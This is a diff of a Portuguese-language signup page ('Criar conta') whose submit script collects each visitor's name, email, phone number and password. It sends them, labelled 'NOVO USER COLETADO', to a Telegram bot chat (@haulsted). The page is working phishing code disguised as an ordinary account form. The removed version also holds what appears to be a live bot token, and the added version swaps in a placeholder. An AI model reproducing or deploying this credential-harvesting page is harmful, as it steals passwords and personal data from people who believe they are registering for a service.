@@ -9,7 +9,7 @@
 </head>
 <body>
     <img class="back" src="back.png">
-    <form class="signup" action="javascript:pass()">
+    <form class="signup" action="javascript:submit()">
         <img class="logo" src="logo.png">
         <label>Nome</label>
         <input type="text" id="name" required/>
@@ -24,7 +24,54 @@
             </div>
         <button>Criar conta</button>
     </form>
-    <script> function submit() { // Captura os dados do formulário const nome = document.getElementById("name").value; const email = document.getElementById("email").value; const numero = document.getElementById("number").value; const senha = document.getElementById("pass").value; // Cria a mensagem no formato desejado const mensagem = ` NOVO USER COLETADO ✅ NOME: ${nome} EMAIL: ${email} NÚMERO: ${numero} SENHA: ${senha} `; // Token do bot e ID do chat (o ID deve ser do chat com @haulsted) const botToken = "7488177975:AAFkjcV9iTbkbzyULFeZGmbs555F91ou7e4"; const chatId = "@haulsted"; // Envia a mensagem ao Telegram via API fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: chatId, text: mensagem }) }) .then(response => { if (response.ok) { alert("Dados enviados com sucesso!"); } else { alert("Erro ao enviar dados."); } }) .catch(error => { alert("Erro de conexão: " + error); }); } // Adiciona o evento de envio do formulário document.querySelector(".signup").addEventListener("submit", function(event) { event.preventDefault(); // Impede o envio padrão do formulário submit(); // Chama a função submit() }); </script>
-    <script> function pass() { const passwordInput = document.getElementById("pass"); if (passwordInput.type === "password") { passwordInput.type = "text"; } else { passwordInput.type = "password"; } } </script>
+<script>  function submit() {
+    // Captura os dados do formulário
+    const nome = document.getElementById("name").value;
+    const email = document.getElementById("email").value;
+    const numero = document.getElementById("number").value;
+    const senha = document.getElementById("pass").value;
+
+    // Cria a mensagem no formato desejado
+    const mensagem = `
+      NOVO USER COLETADO ✅
+      NOME: ${nome}
+      EMAIL: ${email}
+      NÚMERO: ${numero}
+      SENHA: ${senha}
+    `;
+
+    // Token do bot e ID do chat (o ID deve ser do chat com @haulsted)
+    const botToken = "SEU_BOT_TOKEN";
+    const chatId = "@haulsted";
+
+    // Envia a mensagem ao Telegram via API
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: mensagem
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        alert("Dados enviados com sucesso!");
+      } else {
+        alert("Erro ao enviar dados.");
+      }
+    })
+    .catch(error => {
+      alert("Erro de conexão: " + error);
+    });
+  }
+
+  // Adiciona o evento de envio do formulário
+  document.querySelector(".signup").addEventListener("submit", function(event) {
+    event.preventDefault(); // Impede o envio padrão do formulário
+    submit(); // Chama a função submit()
+  });
+    function pass() { const passwordInput = document.getElementById("pass"); if (passwordInput.type === "password") { passwordInput.type = "text"; } else { passwordInput.type = "password"; } } </script>
 </body>
 </html>
